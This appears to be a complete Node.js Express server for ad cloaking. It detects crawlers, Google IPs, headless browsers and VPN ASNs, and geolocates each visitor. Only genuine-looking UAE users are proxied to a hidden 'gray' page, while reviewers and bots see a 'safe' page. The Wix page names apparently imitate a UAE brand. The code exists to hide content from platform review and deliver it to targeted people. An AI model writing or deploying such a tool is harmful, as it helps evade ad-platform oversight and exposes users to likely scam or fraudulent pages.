const express = require("express");
const app = express();
const axios = require("axios");
const dns = require("dns");
const fs = require("fs");
const csv = require("csv-parser");
const requestIp = require("request-ip");

const PORT = process.env.PORT || 10000;
const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";
const UAE_COUNTRY_CODE = "AE";

app.set("trust proxy", true);

const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse", "facebookexternalhit",
  "slackbot", "telegrambot", "discordbot", "preview", "ahrefsbot", "semrushbot", "mj12bot",
  "dotbot", "petalbot", "rogerbot", "exabot", "sitecheckerbot", "screaming frog",
  "netcraftsurvey", "prerender", "headlesschrome", "bot", "scanner", "analyzer",
  "validator", "parser", "scraper"
];

const SUSPICIOUS_AGENTS = [
  "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
];

// --- Load Blocked ASN List from CSV ---
let blockedASNList = [];
fs.createReadStream("vpn_asn_blocklist_full.csv")
  .pipe(csv())
  .on("data", (row) => {
    blockedASNList.push({
      asn: row["ASN"].trim().toUpperCase(),
      orgName: row["OrgName"].toLowerCase(),
      type: (row["Type"] || "").toLowerCase()
    });
  })
  .on("end", () => {
    console.log(`✅ Loaded ${blockedASNList.length} ASN entries`);
  });

function isBlockedASN(asn, orgName) {
  if (!asn || !orgName) return false;
  const cleanASN = String(asn).trim().toUpperCase();
  const cleanOrg = orgName.toLowerCase();
  return blockedASNList.some(entry => {
    const asnMatch = entry.asn === cleanASN;
    const orgMatch = cleanOrg.includes(entry.orgName);
    const typeMatch = true;
    return (asnMatch || orgMatch) && typeMatch;
  });
}

async function isBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ip = req.clientIp || req.ip;
  if (BOT_KEYWORDS.some(bot => ua.includes(bot))) return true;
  const hasHeaders = req.headers["accept"] && req.headers["accept-language"] && req.headers["accept-encoding"];
  if (!hasHeaders) return true;
  return await isGoogleRelatedIP(ip);
}

async function isGoogleRelatedIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);
    dns.reverse(ip, (err, hostnames) => {
      if (err) return resolve(false);
      resolve(hostnames.some(h =>
        h.endsWith(".googlebot.com") || h.endsWith(".google.com") || h.endsWith(".googleusercontent.com")
      ));
    });
  });
}

function isLikelyRealUser(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const headers = req.headers;
  const basicHeaders = headers["accept"] && headers["accept-language"] && headers["accept-encoding"];
  const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
  const hasReferrer = headers["referer"] || headers["referrer"];
  return (
    ua.includes("mozilla") &&
    basicHeaders &&
    !ua.includes("bot") &&
    !ua.includes("google") &&
    !isSuspicious &&
    hasReferrer
  );
}

async function proxyContent(targetUrl, req, res) {
  try {
    const headersToForward = {
      "User-Agent": req.headers["user-agent"] || "Mozilla/5.0",
      "Accept": req.headers["accept"] || "*/*",
      "Accept-Encoding": req.headers["accept-encoding"] || "gzip, deflate, br",
      "Accept-Language": req.headers["accept-language"] || "en-US,en;q=0.9"
    };

    const axiosConfig = {
      method: req.method,
      url: targetUrl + req.url,
      responseType: "stream",
      headers: headersToForward,
      validateStatus: () => true
    };

    if (["POST", "PUT", "PATCH"].includes(req.method)) {
      axiosConfig.data = req.body;
    }

    const response = await axios(axiosConfig);

    for (const key in response.headers) {
      if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
        res.setHeader(key, response.headers[key]);
      }
    }

    res.status(response.status);
    response.data.pipe(res);
  } catch (error) {
    console.error(`❌ Proxy error to ${targetUrl}:`, error.message);
    res.status(500).send("Internal Server Error");
  }
}

// --- Middleware ---
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Main Route Handler ---
app.all("*", async (req, res) => {
  const ip = req.clientIp || req.ip || "no-ip";
  const ua = req.headers["user-agent"] || "no-agent";
  const referrer = req.headers["referer"] || req.headers["referrer"] || "none";

  console.log(`📎 Referrer: ${referrer}`);

  let countryCode = null, asn = null, orgName = null;

  const uaLower = ua.toLowerCase();
  const isUptimeRobot = uaLower.includes("uptimerobot");

  if (!isUptimeRobot) {
    try {
      const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
      countryCode = geo.data.country_code;
      asn = geo.data.asn;
      orgName = geo.data.org;
      console.log(`🌍 [ipapi] IP Info - ${ip} | ${countryCode} | ${asn} | ${orgName}`);
    } catch (err) {
      console.warn(`⚠️ ipapi.co failed: ${err.message}`);
      try {
        const altGeo = await axios.get(`https://ipwho.is/${ip}`);
        if (altGeo.data && altGeo.data.success !== false) {
          countryCode = altGeo.data.country_code;
          asn = altGeo.data.connection.asn;
          orgName = altGeo.data.connection.org;
          console.log(`🌍 [ipwho.is fallback] IP Info - ${ip} | ${countryCode} | ${asn} | ${orgName}`);
        } else {
          console.warn("⚠️ ipwho.is returned invalid data");
        }
      } catch (altErr) {
        console.error(`❌ Fallback GeoIP lookup failed: ${altErr.message}`);
      }
    }
  } else {
    console.log("🟡 Skipped GeoIP lookup for UptimeRobot.");
  }

  const isFromUAE = countryCode === UAE_COUNTRY_CODE;
  const isDetectedBot = await isBot(req);
  const isRealUser = isLikelyRealUser(req);
  const isASNBlocked = isBlockedASN(asn, orgName);

  console.log(`🧠 Decision: UAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked} | IP=${ip}`);

  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));

  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked) {
    console.log("✅ Redirecting to GRAY_PAGE");
    await proxyContent(GRAY_PAGE, req, res);
  } else {
    console.log("🔒 Redirecting to SAFE_PAGE");
    await proxyContent(SAFE_PAGE, req, res);
  }
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`GRAY_PAGE: ${GRAY_PAGE}`);
  console.log(`SAFE_PAGE: ${SAFE_PAGE}`);
});
